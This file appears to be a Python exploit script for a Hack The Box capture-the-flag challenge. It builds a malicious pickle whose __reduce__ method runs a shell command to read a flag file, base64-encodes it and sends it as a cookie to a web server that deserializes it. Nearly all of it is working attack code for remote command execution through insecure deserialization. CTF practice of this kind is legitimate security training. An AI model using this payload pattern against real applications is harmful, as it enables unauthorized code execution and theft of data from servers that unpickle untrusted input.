import subprocess
import base64
import cPickle

class Exploit(object):
    def __reduce__(self):
        return subprocess.check_output, (['cat','flag_wIp1b'],)

def serialize_exploit():
    #with open('test.pickle','wb') as f:
    #    _pickle.dump(Exploit(),f,protocol=0)
    shellcode = _pickle.dumps({'serum':Exploit()},protocol=0)
    return shellcode

'''
if __name__ == "__main__":
    cookie = "KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu"
    serialized = base64.b64decode(cookie)
    anti_pickle_serum = Exploit
    deserialized = cPickle.loads(serialized)
    print (deserialized)
    
    #plan_b = base64.b64encode(serialize_exploit())
    #print (plan_b.decode("utf-8"))

    pass
'''
#'''
def get_plan_b():
    shellcode = cPickle.dumps({"serum": Exploit()}, protocol=0)
    #print(shellcode)
    plan_b = base64.b64encode(shellcode)
    return plan_b

import requests
from bs4 import BeautifulSoup

def send():
    session = requests.session()

    burp0_url = "http://babyrick.htb:32238/"
    burp0_cookies = {"plan_b": "%s" % get_plan_b()}
    
    r = session.get(burp0_url, cookies=burp0_cookies)
    soup = BeautifulSoup(r.text,features="html.parser")
    print (soup.span)
    pass

send()
#'''
